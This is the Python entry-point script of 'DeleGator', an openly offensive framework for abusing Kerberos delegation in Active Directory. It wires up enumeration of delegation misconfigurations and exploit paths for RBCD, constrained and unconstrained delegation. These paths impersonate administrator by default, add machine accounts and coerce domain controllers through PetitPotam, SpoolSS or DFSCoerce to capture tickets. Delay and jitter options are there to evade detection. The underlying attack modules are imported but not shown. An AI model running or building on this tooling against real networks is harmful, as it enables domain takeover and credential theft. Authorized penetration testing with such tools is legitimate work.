#!/usr/bin/env python3
"""
delegator.py

DeleGator — Linux-native Kerberos delegation abuse framework
by cbev  •  github.com/cbev0x/DeleGator

Usage:
  delegator.py enum    -d <domain> -u <user> [auth] [options]
  delegator.py exploit -d <domain> -u <user> [auth] --type <type> [options]

Authentication (exactly one required):
  -p PASSWORD           Plaintext password
  -H HASH               NTLM hash (LM:NT, :NT, or bare NT)
  --ccache PATH         Kerberos ccache file (or set KRB5CCNAME)
  --pfx PATH            PFX/PKCS12 certificate file
  --pfx-pass PASS       PFX decryption password
  --cert PATH           PEM certificate file
  --key PATH            PEM private key file

Enumeration options:
  --all                 Enumerate all delegation types (default)
  --unconstrained       Enumerate unconstrained delegation only
  --constrained         Enumerate constrained delegation only
  --rbcd                Enumerate RBCD write paths only
  --no-reachable        Skip reachability checks on unconstrained targets
  --search-base BASE    Restrict LDAP queries to a specific OU

Exploitation options:
  --type TYPE           Delegation type: rbcd | constrained | unconstrained
  --target TARGET       Target computer (rbcd, unconstrained)
  --service-account SA  Service account with delegation (constrained)
  --target-spn SPN      SPN to request a ticket for
  --impersonate USER    User to impersonate (default: administrator)
  --delegate-account A  Existing account to use as RBCD delegation source
  --delegate-pass PASS  Password for delegation source account
  --add-computer        Create a new machine account for RBCD
  --new-computer NAME   Name for the new machine account
  --new-computer-pass P Password for the new machine account
  --cleanup             Remove RBCD attribute after exploitation
  --coerce-target HOST  Machine to coerce for unconstrained delegation
  --listener-ip IP      Listener IP for coercion TGT capture
  --coerce-method M     Coercion method: SpoolSS|PetitPotam|DFSCoerce
  --manual-ccache PATH  Process an already-captured ccache directly
  --watch               Monitor for captured TGTs automatically
  --watch-timeout SECS  Timeout for TGT watch mode (default: 60)
  --service-spn SPN     Override auto-detected service SPN
  --user-ccache PATH    User ccache for constrained (no proto transition)
  --proto-transition    Force protocol transition mode
  --no-proto-transition Force non-protocol-transition mode

OPSEC options:
  --delay MS            Delay between LDAP queries in milliseconds
  --jitter PCT          Jitter percentage for delay (0-100)
  --slow                Slow mode preset (2000ms delay, 30% jitter)
  --opsec-check         Prompt before noisy operations

Output options:
  --json                Emit JSON output for tool chaining
  --out DIR             Output directory for ccache files (default: /tmp)
  --quiet               Suppress banner and info messages
"""

# ---------------------------------------------------------------------------
# Path fix — must be before any local imports.
# Adds the directory containing this script to sys.path so that
# core/, modules/, and utils/ are importable regardless of where
# the script is invoked from.
# ---------------------------------------------------------------------------
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.realpath(__file__)))

import argparse


# ---------------------------------------------------------------------------
# Argument parser
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="delegator.py",
        description="DeleGator — Linux-native Kerberos delegation abuse framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=True,
    )

    # Global required arguments
    parser.add_argument("-d", "--domain",   required=True,  metavar="DOMAIN",
                        help="Domain FQDN (e.g. delegator.lab)")
    parser.add_argument("-u", "--username", required=True,  metavar="USER",
                        help="Username")
    parser.add_argument("--dc-ip",          required=True,  metavar="IP",
                        help="Domain controller IP")

    # Authentication
    auth_group = parser.add_argument_group("Authentication")
    auth_group.add_argument("-p", "--password",  default=None, help="Plaintext password")
    auth_group.add_argument("-H", "--hashes",    default=None, metavar="HASH",
                            help="NTLM hash: LM:NT or :NT or bare NT")
    auth_group.add_argument("--ccache",          default=None, metavar="PATH",
                            help="ccache file path (or set KRB5CCNAME)")
    auth_group.add_argument("--pfx",             default=None, metavar="PATH",
                            help="PFX/PKCS12 certificate file")
    auth_group.add_argument("--pfx-pass",        default=None, metavar="PASS",
                            help="PFX decryption password")
    auth_group.add_argument("--cert",            default=None, metavar="PATH",
                            help="PEM certificate file")
    auth_group.add_argument("--key",             default=None, metavar="PATH",
                            help="PEM private key file")

    # OPSEC options
    opsec_group = parser.add_argument_group("OPSEC")
    opsec_group.add_argument("--delay",       type=int, default=0,     metavar="MS",
                             help="Delay between queries in milliseconds")
    opsec_group.add_argument("--jitter",      type=int, default=0,     metavar="PCT",
                             help="Jitter percentage for delay (0-100)")
    opsec_group.add_argument("--slow",        action="store_true",
                             help="Slow mode: 2000ms delay, 30%% jitter")
    opsec_group.add_argument("--opsec-check", action="store_true",
                             help="Prompt before operations that generate detectable events")

    # Output options
    out_group = parser.add_argument_group("Output")
    out_group.add_argument("--json",    action="store_true", help="Emit JSON output")
    out_group.add_argument("--out",     default="/tmp",      help="ccache output directory")
    out_group.add_argument("--quiet",   action="store_true", help="Suppress banner and info")
    out_group.add_argument("--use-ssl", action="store_true", help="Use LDAPS (port 636)")

    # Subcommands
    subparsers = parser.add_subparsers(dest="command", metavar="COMMAND")
    subparsers.required = True

    # ── enum ──────────────────────────────────────────────────────────────
    enum_parser = subparsers.add_parser(
        "enum",
        help="Enumerate delegation misconfigurations",
    )
    enum_type = enum_parser.add_mutually_exclusive_group()
    enum_type.add_argument("--all",           action="store_true", default=True,
                           help="Enumerate all delegation types (default)")
    enum_type.add_argument("--unconstrained",  action="store_true",
                           help="Enumerate unconstrained delegation only")
    enum_type.add_argument("--constrained",    action="store_true",
                           help="Enumerate constrained delegation only")
    enum_type.add_argument("--rbcd",           action="store_true",
                           help="Enumerate RBCD write paths only")
    enum_parser.add_argument("--no-reachable", action="store_true",
                             help="Skip TCP reachability checks")
    enum_parser.add_argument("--search-base",  default=None, metavar="BASE",
                             help="Restrict LDAP queries to a specific OU")

    # ── exploit ───────────────────────────────────────────────────────────
    exploit_parser = subparsers.add_parser(
        "exploit",
        help="Exploit a delegation misconfiguration",
    )
    exploit_parser.add_argument(
        "--type", required=True,
        choices=["rbcd", "constrained", "unconstrained"],
        help="Delegation type to exploit",
    )

    # Shared exploit options
    exploit_parser.add_argument("--target",      default=None, metavar="COMPUTER",
                                help="Target computer account (rbcd, unconstrained)")
    exploit_parser.add_argument("--impersonate", default="administrator",
                                help="User to impersonate (default: administrator)")
    exploit_parser.add_argument("--target-spn",  default=None, metavar="SPN",
                                help="Target SPN to request a ticket for")

    # RBCD options
    rbcd_group = exploit_parser.add_argument_group("RBCD")
    rbcd_group.add_argument("--delegate-account",  default=None, metavar="ACCOUNT",
                            help="Existing account to use as RBCD delegation source")
    rbcd_group.add_argument("--delegate-pass",     default=None, metavar="PASS",
                            help="Password for the delegation source account")
    rbcd_group.add_argument("--delegate-ccache",   default=None, metavar="PATH",
                            help="ccache for delegation source account (instead of --delegate-pass)")
    rbcd_group.add_argument("--add-computer",      action="store_true",
                            help="Create a new machine account for RBCD")
    rbcd_group.add_argument("--new-computer",      default=None, metavar="NAME",
                            help="Name for the new machine account")
    rbcd_group.add_argument("--new-computer-pass", default=None, metavar="PASS",
                            help="Password for the new machine account")
    rbcd_group.add_argument("--cleanup",           action="store_true",
                            help="Remove RBCD attribute after exploitation")

    # Constrained options
    const_group = exploit_parser.add_argument_group("Constrained delegation")
    const_group.add_argument("--service-account",    default=None, metavar="ACCOUNT",
                             help="Service account with constrained delegation")
    const_group.add_argument("--service-spn",        default=None, metavar="SPN",
                             help="Override auto-detected service SPN")
    const_group.add_argument("--user-ccache",        default=None, metavar="PATH",
                             help="User ccache for non-protocol-transition path")
    const_group.add_argument("--proto-transition",   action="store_true", default=None,
                             help="Force protocol transition exploitation path")
    const_group.add_argument("--no-proto-transition", action="store_true",
                             help="Force non-protocol-transition path")

    # Unconstrained options
    uncon_group = exploit_parser.add_argument_group("Unconstrained delegation")
    uncon_group.add_argument("--coerce-target",  default=None, metavar="HOST",
                             help="Machine to coerce (typically a DC)")
    uncon_group.add_argument("--listener-ip",    default=None, metavar="IP",
                             help="Listener IP for TGT capture")
    uncon_group.add_argument("--coerce-method",  default="SpoolSS",
                             choices=["SpoolSS", "PetitPotam", "DFSCoerce"],
                             help="Coercion technique (default: SpoolSS)")
    uncon_group.add_argument("--manual-ccache",  default=None, metavar="PATH",
                             help="Process an already-captured ccache directly")
    uncon_group.add_argument("--watch",          action="store_true",
                             help="Monitor for captured TGTs automatically")
    uncon_group.add_argument("--watch-timeout",  type=int, default=60, metavar="SECS",
                             help="Timeout for TGT watch mode (default: 60)")

    return parser


# ---------------------------------------------------------------------------
# Subcommand handlers
# ---------------------------------------------------------------------------

def handle_enum(args) -> None:
    from core.auth import build_auth_context
    from modules.enumerate import EnumConfig, run_enumeration

    auth = build_auth_context(args)

    specific = args.unconstrained or args.constrained or args.rbcd
    config = EnumConfig(
        dc_ip=args.dc_ip,
        domain=args.domain,
        all_types=not specific,
        unconstrained=args.unconstrained,
        constrained=args.constrained,
        rbcd=args.rbcd,
        check_reachable=not args.no_reachable,
        json_out=args.json,
        opsec_check=args.opsec_check,
        delay_ms=args.delay,
        jitter_pct=args.jitter,
        slow=args.slow,
        search_base=args.search_base,
        output_dir=args.out,
        use_ssl=args.use_ssl,
    )

    run_enumeration(auth, config)


def handle_exploit(args) -> None:
    from core.auth import build_auth_context
    auth = build_auth_context(args)

    exploit_type = args.type.lower()

    if exploit_type == "rbcd":
        _handle_rbcd(args, auth)
    elif exploit_type == "constrained":
        _handle_constrained(args, auth)
    elif exploit_type == "unconstrained":
        _handle_unconstrained(args, auth)


def _handle_rbcd(args, auth) -> None:
    from modules.rbcd import RBCDConfig, run_rbcd
    from utils.output import error

    if not args.target:
        error("--target is required for RBCD exploitation.")
        sys.exit(1)

    if not args.add_computer and not args.delegate_account:
        error(
            "RBCD requires a delegation source account.\n"
            "  Use --delegate-account <account> --delegate-pass <pass>\n"
            "  or use --add-computer to create a new machine account."
        )
        sys.exit(1)

    config = RBCDConfig(
        dc_ip=args.dc_ip,
        domain=args.domain,
        target=args.target,
        impersonate=args.impersonate,
        target_spn=args.target_spn,
        delegate_account=args.delegate_account,
        delegate_pass=args.delegate_pass,
            delegate_ccache=getattr(args, "delegate_ccache", None),
        add_computer=args.add_computer,
        new_computer_name=args.new_computer,
        new_computer_pass=args.new_computer_pass,
        cleanup=args.cleanup,
        opsec_check=args.opsec_check,
        delay_ms=args.delay,
        jitter_pct=args.jitter,
        output_dir=args.out,
        use_ssl=args.use_ssl,
    )

    run_rbcd(auth, config)


def _handle_constrained(args, auth) -> None:
    from modules.constrained import ConstrainedConfig, run_constrained
    from utils.output import error

    if not args.service_account:
        error("--service-account is required for constrained delegation exploitation.")
        sys.exit(1)

    if not args.target_spn:
        error(
            "--target-spn is required for constrained delegation exploitation.\n"
            "  Example: --target-spn MSSQLSvc/DC01.delegator.lab:1433"
        )
        sys.exit(1)

    proto_trans = None
    if args.proto_transition:
        proto_trans = True
    elif args.no_proto_transition:
        proto_trans = False

    config = ConstrainedConfig(
        dc_ip=args.dc_ip,
        domain=args.domain,
        service_account=args.service_account,
        target_spn=args.target_spn,
        impersonate=args.impersonate,
        user_ccache=args.user_ccache,
        proto_transition=proto_trans,
        service_spn=args.service_spn,
        opsec_check=args.opsec_check,
        delay_ms=args.delay,
        jitter_pct=args.jitter,
        output_dir=args.out,
        use_ssl=args.use_ssl,
    )

    run_constrained(auth, config)


def _handle_unconstrained(args, auth) -> None:
    from modules.unconstrained import UnconstrainedConfig, run_unconstrained
    from utils.output import error

    if not args.target:
        error("--target is required for unconstrained delegation exploitation.")
        sys.exit(1)

    config = UnconstrainedConfig(
        dc_ip=args.dc_ip,
        domain=args.domain,
        target=args.target,
        coerce_target=args.coerce_target,
        listener_ip=args.listener_ip,
        coerce_method=args.coerce_method,
        ccache_dir=args.out,
        watch_timeout=args.watch_timeout,
        manual_ccache=args.manual_ccache,
        opsec_check=args.opsec_check,
        delay_ms=args.delay,
        jitter_pct=args.jitter,
        output_dir=args.out,
        use_ssl=args.use_ssl,
    )

    run_unconstrained(auth, config)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    from utils.output import print_banner, set_json_mode, set_quiet_mode

    parser = build_parser()

    raw_args   = sys.argv[1:]
    json_mode  = "--json"  in raw_args
    quiet_mode = "--quiet" in raw_args

    set_json_mode(json_mode)
    set_quiet_mode(quiet_mode)

    if not json_mode and not quiet_mode:
        print_banner()

    args = parser.parse_args()

    if args.command == "enum":
        handle_enum(args)
    elif args.command == "exploit":
        handle_exploit(args)


if __name__ == "__main__":
    main()
